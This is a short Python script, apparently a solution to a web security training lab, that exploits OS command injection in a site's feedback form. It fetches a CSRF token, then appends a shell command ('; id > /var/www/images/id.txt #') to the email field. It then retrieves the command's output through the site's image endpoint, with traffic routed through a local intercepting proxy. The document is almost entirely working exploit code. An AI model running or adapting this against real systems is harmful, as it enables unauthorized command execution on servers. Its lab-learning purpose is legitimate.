#!/bin/python3
import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    path = '/feedback'
    response = session.get(url+path, proxies=proxy, verify=0)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find("input")['value']
    return token

def submit_feedback_form(url, session):
    path = '/feedback/submit'
    csrf_token = "asdfasdfasdf"
    payload = '; id > /var/www/images/id.txt #'
    data = {'csrf' : get_csrf_token(url, session),'name' : 'test', 'email' : 'test@test.com'+payload, 'subject' : 'test', 'message' : 'test'}
    response = session.post(url+path, data=data, verify=0, proxies=proxy)
    if (response.status_code == 200): print("[*] Injected the command!")

    payload_output = '/image?filename=id.txt'
    payload_response = session.get(url+payload_output, verify=0, proxies=proxy)
    if payload_response.status_code == 200:
        print("[+] Injection successful!")
        print(f"Payload output: {payload_response.text}")
    else:
        print("[-] Failed")

def main():
    if len(sys.argv) == 1:
        print(f"Usage: {sys.argv[0]} <URL>")
        quit()
    url = sys.argv[1]
    session = requests.Session()
    submit_feedback_form(url, session)

if __name__ == "__main__":
    main()
